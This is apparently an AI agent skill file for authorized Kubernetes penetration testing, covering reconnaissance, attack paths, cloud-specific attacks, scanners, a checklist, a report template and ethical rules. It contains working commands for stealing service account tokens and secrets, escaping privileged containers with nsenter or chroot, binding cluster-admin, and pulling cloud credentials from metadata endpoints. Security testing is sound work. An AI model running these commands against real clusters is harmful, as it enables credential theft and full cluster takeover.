---
name: k8s-security-redteam
description: Use when conducting authorized penetration tests, performing security assessments, running red team exercises, testing security controls, identifying attack paths, or validating hardening measures
---

# Kubernetes Security Red Team

Perform offensive security testing of Kubernetes platforms including penetration testing, attack paths, and vulnerability assessment.

## Keywords

kubernetes, security, red team, penetration testing, pentest, attack, exploiting, exploit, privilege escalation, container escape, rbac, secrets, vulnerability, assessment, offensive, conducting, performing, running, testing, identifying, validating

## When to Use This Skill

- Conducting authorized penetration tests
- Performing security assessments
- Running red team exercises
- Testing security controls
- Identifying attack paths
- Validating hardening measures

**IMPORTANT**: Only use these techniques on systems you have explicit written authorization to test.

## Related Skills

- [k8s-security-hardening](../k8s-security-hardening) - What defenses to test
- [k8s-platform-tenancy](../k8s-platform-tenancy) - Tenant isolation to test
- [k8s-platform-operations](../k8s-platform-operations) - Incident response after findings
- [k8s-continual-improvement](../k8s-continual-improvement) - Track security debt
- [k8s-namespace-troubleshooting](../k8s-namespace-troubleshooting) - Diagnose exploited namespaces
- [Shared: RBAC Patterns](../_shared/references/rbac-patterns.md) - RBAC to audit

## Quick Reference

| Task | Command |
|------|---------|
| Check permissions | `kubectl auth can-i --list` |
| Find privileged pods | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.containers[].securityContext.privileged==true)'` |
| List secrets | `kubectl get secrets -A` |
| Test anonymous access | `kubectl --as=system:anonymous auth can-i --list` |

## Attack Surface

### External
- Kubernetes API (TCP 6443)
- Ingress controllers (TCP 80, 443)
- NodePort services (TCP 30000-32767)
- Exposed dashboards
- Cloud metadata endpoints

### Internal (from compromised pod)
- Service account tokens
- Secrets in environment/volumes
- Network connectivity
- Mounted volumes
- Cloud IMDS

## Reconnaissance

### External
```bash
# Port scan
nmap -sV -p 6443,443,80,30000-32767 ${TARGET}

# Check anonymous access
curl -k https://${API_SERVER}:6443/api/v1/namespaces

# Test anonymous auth
kubectl --server=https://${API}:6443 --insecure-skip-tls-verify auth can-i --list
```

### Internal (from pod)
```bash
# Current permissions
kubectl auth can-i --list

# SA token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Enumerate
kubectl get namespaces
kubectl get secrets -A
kubectl get pods -A -o wide
```

## Attack Paths

### 1. Service Account Token Abuse
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets
```

### 2. Privileged Container Escape
```bash
# Mount host filesystem
mkdir /host && mount /dev/sda1 /host
chroot /host

# Or nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### 3. RBAC Escalation
```bash
# Check dangerous permissions
kubectl auth can-i escalate roles
kubectl auth can-i bind clusterroles
kubectl auth can-i impersonate users
kubectl auth can-i create pods/exec

# Escalate if can create rolebindings
kubectl create rolebinding pwn --clusterrole=cluster-admin --user=$(whoami)
```

### 4. Cloud Metadata Exploitation

**AWS:**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**GCP:**
```bash
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure:**
```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Cloud-Specific Attacks

### AWS EKS
- IRSA token theft from projected SA volumes
- Node IAM role abuse via IMDS
- aws-auth ConfigMap manipulation
- EKS cluster role misconfiguration

### GCP GKE
- Workload Identity token theft
- Metadata concealment bypass
- GKE node service account abuse
- Anthos Config Management exploitation

### Azure AKS
- Azure AD Pod Identity abuse
- Managed Identity exploitation
- AKS RBAC misconfiguration
- Key Vault access via MI

## Vulnerability Assessment Tools

### Installation
```bash
# kubescape
brew install kubescape

# trivy (includes cluster scanning, image scanning, and k8s misconfiguration detection)
brew install trivy
```

> **Note**: kube-hunter (formerly by Aqua Security) has been deprecated and is no longer maintained. Use `trivy k8s` for equivalent cluster vulnerability scanning.

### Running Scans
```bash
# kubescape
kubescape scan framework nsa,mitre

# trivy cluster scan (replaces kube-hunter)
trivy k8s --report summary cluster

# trivy targeted scan
trivy k8s --namespace ${NAMESPACE} --report all
```

## Testing Checklist

### Authentication
- [ ] Anonymous API access
- [ ] Default dashboard credentials
- [ ] Weak service account tokens
- [ ] Missing token expiration

### Authorization
- [ ] Overly permissive RBAC
- [ ] Privilege escalation paths
- [ ] Cross-namespace access
- [ ] Wrong secret access

### Network
- [ ] Missing network policies
- [ ] Unrestricted pod traffic
- [ ] Metadata endpoint access
- [ ] External exposure

### Container
- [ ] Privileged containers
- [ ] Host namespace access
- [ ] Writable root filesystem
- [ ] Capabilities not dropped

## MITRE ATT&CK Mapping

| Technique | ID | Test |
|-----------|-----|------|
| Valid Accounts | T1078 | Token leakage |
| Container Admin | T1609 | kubectl exec |
| Escape to Host | T1611 | Privileged abuse |
| Credential Access | T1555 | Secret enumeration |
| Lateral Movement | T1021 | Pod-to-pod access |

## Reporting

### Finding Template
```markdown
## [CRITICAL/HIGH/MEDIUM/LOW] Finding Title

**Description**: What the vulnerability is

**Impact**: What an attacker could do

**Evidence**:
- Commands and output

**Affected Resources**:
- Specific resources

**Remediation**:
1. Immediate fix
2. Long-term solution

**References**:
- CIS control
- MITRE technique
```

## Common Mistakes

| Mistake | Why It Fails | Instead |
|---------|--------------|---------|
| Testing production clusters without written scope document | Causes unplanned outages; legal and compliance exposure | Get explicit written authorization defining scope, timing, and boundaries |
| Exploiting a vulnerability without documenting the steps | Finding cannot be reproduced or verified; remediation team cannot confirm fix | Record exact commands and outputs as you go |
| Leaving privileged pods or RoleBindings after testing | Attackers can reuse your test artifacts as real attack vectors | Clean up all artifacts immediately after each test phase |
| Assuming RBAC is the only access control | Network-level access, cloud IAM, and metadata endpoints bypass RBAC entirely | Test all attack surfaces: RBAC, network, cloud IMDS, runtime |
| Running scans at peak traffic hours | Scanning generates load; may trigger alerts and degrade user experience | Schedule intensive scans during maintenance windows |

## Ethical Guidelines

1. **Written authorization** required before testing
2. **Scope clearly defined** and respected
3. **No production data** exfiltration
4. **Report all findings** responsibly
5. **Clean up** any artifacts created
6. **Document everything** for reproducibility
